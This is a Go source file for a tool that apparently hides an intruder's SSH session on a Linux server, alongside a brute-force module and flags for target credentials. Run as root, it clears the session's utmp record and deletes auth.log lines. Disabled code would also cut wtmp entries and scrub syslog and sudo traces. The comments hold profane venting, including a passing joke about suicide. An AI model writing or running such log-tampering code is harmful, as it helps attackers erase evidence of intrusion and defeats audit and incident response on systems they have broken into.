package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"reflect"
	"slices"
	"strconv"
	"strings"
	authlog "test/AUTHLOG"
	bf "test/BF"
	check "test/CHECK"
	getpty "test/GETPTY"
	utmp "test/UTMP"
	vars "test/VARS"
	"time"
)

// When I wrote this Code
// Only God and I
// Knew how it worked
// Now only God knows it !
// Good luck
// What am i doing with my life? :(
// What the fuck i have writen here?
// That file/ folder supposed to be a test file not a productive
// Log Lurnal of 28 Jun 2024 i slpit the project in multipple files
// I am scared for two things first of all if the entire pc crases
// and secondly and most the terrifing if i summon Baphomet

// UPDATE i run the UTMP Function and it workted (tears of accomplisment spread through my cheeks)
// Second UPDATE same day. Evrything crushes.

// 2 Jul 20 After a day off due to explosing diarrea i return to spread some tears againe

// Something magic happent. Somehow something workes. BUT copy paste comments makes errors. WTF?

// My supervisor just said to me that everything that i have wrote doesent matters.

// suicide seems a good choice

// I have change evrythong The hol programm needs to be changed FUUUUUUUCCCCCKKKKKKK

// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHHHH buck here againe fuck this project.

// GEOPROJECT

// FUCK MY LIFE evrything has to be changed. Regex doesent work Time stams are wrong

// FUCK FUCK FUCK I FOUND AN EASYER WAY AND MUCH MORE EFFECIENT  30% AT LEAST OF THE CODE GOES TO GARBAGE

// WEAKEND IS COMING

// 200 hundrend lines of pure pain just deleted

var indexToDel int64
var count int64
var ProxyIp [16]byte

// const LASTLOG_FILE = "/var/log/lastlog"
// const LINE_LENGTH = 292 // Size of each entry in lastlog (defined in /usr/include/lastlog.h)

var play bool = true

func init() {
	// Initialize flags

	flag.BoolVar(&vars.Destr, "d", false, "Self Destruct")
	flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
	flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
	flag.StringVar(&vars.BrFile, "f", "", "Data File")
	// flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
	flag.StringVar(&vars.Port, "p", "", "Server Port")
	flag.StringVar(&vars.User, "u", "", "Server Username")
	flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
	flag.StringVar(&vars.ConnectedUser, "cu", "ubuntu", "Connected User To Delete")
	flag.IntVar(&vars.Threads, "t", 3, "Threads")

}

func main() {
	// history.DelHistory()

	connectedData, _ := getpty.GetConectedData()
	fmt.Println("APP", connectedData.AppPTY, "SSH", connectedData.SSHPTY, "USer", connectedData.User, "SSH TIME : ", connectedData.TimeLoginSSH, "AppTime", connectedData.TimeProgrammStart, "SSH PID : ", connectedData.SSHPID, "FirstSpown ID :", connectedData.FirstSpownID)
	// time.Sleep(30 * time.Second)

	if true {
		if vars.HideMe {

			euid := os.Geteuid()
			if euid == 0 {
				// connectedUser := flag.String("u", "ubuntu", "Connected User")
				flag.Parse()
				myepoch, err := utmp.ParceUtmpFileToGetEpoch(connectedData)

				fmt.Println(myepoch, "EPOCH")
				check.Check("Error On parshing UTMP file for EPOCH", err)
				connectedData.TimeLoginSSHEpoch = myepoch
				sessNum, err := utmp.GetSessionId(connectedData.TimeLoginSSHEpoch)
				check.Check("error On Getting Session Number", err)
				// connectedData.SessionNumber = sessNum
				utmp.ClearUTMP(connectedData)
				fmt.Println(sessNum, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
				time.Sleep(10 * time.Second)
				dataToInfl, _ := parceDataWtmpFile(connectedData)
				dataToInfl.ConData.SessionNumber = sessNum
				fmt.Println(dataToInfl, "CXAXAAXAXAXXAXAAXAXXAXAXAAXAXAXXAAX")

				// ConvertIPToBytearray(&connectedData.IP)

				// lastlog.ChangeLastLog(&connectedData.IP, &dataToInfl, &vars.ConnectedUser)
				// /////////////////////////////////////////////////////////////////////////////
				// sessionStart := int(dataToInfl.Time.Sec)
				// sessionStop := int(dataToInfl.TimeEnd.Sec)

				// start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)

				// fmt.Println(sessionStart, sessionStop, connectedData.TimeLoginSSH, "AAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSS~~~~~~~~~~~~~~")
				err = authlog.DeleteLineAuthLog(dataToInfl)
				fmt.Println(err)

				if false {
					// check.Check("Delete Auth Log ", err)

					// patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
					// if err != nil {
					// 	fmt.Println("Errpr", err)
					// }
					// ex, err := os.Executable()
					// if err != nil {
					// 	panic(err)
					// }

					// exPath := filepath.Dir(ex)
					// patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
					// check.Check("Error on delete Line Auth Log", err)
					// err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
					// if err != nil {
					// 	fmt.Println(err)
					// }
				}
			}
		}
		if false {
			bf.Bf()
		}
	}

	// time.Sleep(15 * time.Second)

}

func ConvertIPToBytearray(ip *string) {

	splitIP := strings.Split(*ip, ".")
	for n, s := range splitIP {
		i, err := strconv.Atoi(s)
		if err != nil {
			fmt.Println(err, "asd")
		}

		// To handle both 32-bit and 64-bit architectures, you can use int32 or int64
		var number8 int8 = int8(i) // Convert to int64 for this example

		buffer := new(bytes.Buffer)
		err = binary.Write(buffer, binary.BigEndian, number8)
		if err != nil {
			fmt.Println("binary.Write failed:", err)
		}
		finalByteArray := buffer.Bytes()
		ProxyIp[n] = finalByteArray[0]
	}
}

// This fuck checks the WTMP file
// WTMP holds the last data
func parceDataWtmpFile(connectedUser vars.ConnectedData) (vars.DataToInfl, error) {

	count = 0
	// sizeUtmp := int64(binary.Size(Utmp{}))
	// fmt.Println(sizeUtmp)
	file, err := os.Open(vars.WTMP)
	if err != nil {
		fmt.Printf("Error opening utmp file: %v\n", err)
		return vars.DataToInfl{}, err
	}
	defer file.Close()

	DtIN := []vars.DataToInfl{}
	for {

		var record vars.Utmp
		err := binary.Read(file, binary.LittleEndian, &record)
		if err != nil {
			break
		}

		name := ""

		for _, j := range record.User[:] {
			if j > 0 {
				name = name + string(j)
			}
		}
		// bs, err := hex.DecodeString(record.Device)
		if name == connectedUser.User && record.Type == 0x7 && connectedUser.SSHPTY == strings.TrimRight(string(record.Device[:]), "\x00") {

			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
				Pid: record.Pid,
				Time: vars.TimeVal{
					Sec:  record.Time.Sec,
					Usec: record.Time.Usec},
				TimeEnd: vars.TimeVal{},
				AddrV6:  record.AddrV6,
				Device:  record.Device})
			indexToDel = count
			// fmt.Println(DtIN)

		} else if record.Type == 0x8 {
			for i, j := range DtIN {
				// fmt.Println(j.Pid, record.Pid, j.Device, record.Device, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAASSSSSSSSSSSSSSSSSSSSSSSS")
				if j.Pid == record.Pid && reflect.DeepEqual(j.Device, record.Device) {
					fmt.Println("ASDASFASDOKASDKGFSAODKGFKASDOKFSADKFKSADOFKSADOKFSOADKFOSADKFSODK")
					DtIN[i].Time.Sec = record.Time.Sec
					DtIN[i].Time.Usec = record.Time.Usec
				}
			}
		}
		count += 1
	}

	//////////////////////////////////////////////////////////////////////////////
	if false {
		err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
		if err != nil {
			fmt.Println(err)
		}
	}
	//////////////////////////////////////////////////////////////////////////////
	slices.Reverse(DtIN)
	if len(DtIN) > 1 {
		DtIN = DtIN[1:]
		dess := vars.Dessisions{}
		for i, d := range DtIN {
			if connectedUser.User == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
				dess.Dessision = append(dess.Dessision, i)
			}
		}
		finalDtI := vars.DataToInfl{}

		if len(dess.Dessision) > 0 {
			finalDtI = DtIN[dess.Dessision[0]]
			finalDtI.ConData = connectedUser
		}
		return finalDtI, nil
	} else {
		fmt.Println("PRINT THEM")
		time.Sleep(60 * time.Second)
		return vars.DataToInfl{}, nil

	}

}

func deleteBytesFromFile(filePath string, start int64, count int64) error { //wtmp 24*384 384
	// Read the file contents
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Check if the range to delete is valid
	fileSize := int64(len(data))
	if start < 0 || start >= fileSize || start+count > fileSize {
		return fmt.Errorf("invalid range")
	}

	// Remove the bytes from the slice
	copy(data[start:], data[start+count:])

	// Truncate the file
	err = os.Truncate(filePath, fileSize-count)
	if err != nil {
		return err
	}

	// Write the modified data back to the file
	err = os.WriteFile(filePath, data[:fileSize-count], 0644)
	if err != nil {
		return err
	}

	return nil
}
